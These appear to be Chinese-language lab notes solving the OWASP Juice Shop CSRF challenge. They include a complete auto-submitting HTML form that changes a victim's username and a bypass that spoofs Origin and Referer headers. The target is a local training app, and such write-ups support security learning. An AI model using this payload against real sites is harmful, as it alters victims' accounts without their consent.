- CSRF
    - 描述：从其他来源 http://htmledit.squarefree.com/ 执行跨站请求伪造来更改用户的名称。
    - 提示：
        > 请注意，该挑战只能使用指定的在线 HTML 编辑器来解决。这意味着当你使用其他来源（例如 JSFiddle 或 CodePen）时，Juice Shop 将不会认为该挑战已被解决。
    - 使用修改用户名的功能，提交的请求为
        ```POST /profile HTTP/1.1```
        ```username=a```
    - 尝试转为 ```GET``` 方法，失败
    - 使用 Burp 的 CSRF 概念验证器或手动设置 HTML 表单
        ```html
        <html>
        <body>
            <form action="http://127.0.0.1:3000/profile" method="POST">
            <input type="hidden" name="username" value="aegsdvh" />
            <input type="submit" value="Submit request" />
            </form>
            <script>
            history.pushState('', '', '/');
            document.forms[0].submit();
            </script>
        </body>
        </html>
        ```
    - 此靶场未设置模拟控制站点，而是使用登录 Juice Shop 账户的浏览器中保存的 Cookie 模拟受害者登录，然后使用在线代码编辑器来模拟攻击者控制的站点
    - 绕过方法：挑战执行 CSRF 站点，于是提交一个普通的修改用户名的 POST 请求后，修改请求头
        ```
        Origin: http://htmledit.squarefree.com/
        Referer: http://htmledit.squarefree.com/
        ```
        发送后通过挑战
    - 允许跨站携带 Cookie 时则拥有 CSRF 风险